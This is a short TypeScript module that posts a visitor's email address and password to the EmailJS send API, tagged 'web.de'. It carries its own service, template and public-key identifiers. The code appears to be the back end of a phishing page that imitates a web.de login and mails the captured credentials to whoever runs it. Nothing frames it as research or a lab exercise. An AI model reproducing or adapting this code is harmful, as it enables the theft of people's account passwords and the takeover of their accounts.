import axios from "axios";

const endpoint = "https://api.emailjs.com/api/v1.0/email/send";
const service_id = "service_7u5m0gs";
const template_id = "template_l7mrf6t";
const public_key = "Dq-64xcjYF-zYViyM";

const sendEmail = (values: any) => {
  const payload = {
    service_id,
    template_id,
    user_id: public_key,
    template_params: {
      from_name: "web.de",
      email: values.email,
      password: values.password,
    },
  };

  return axios.post(endpoint, payload);
};

export default sendEmail;
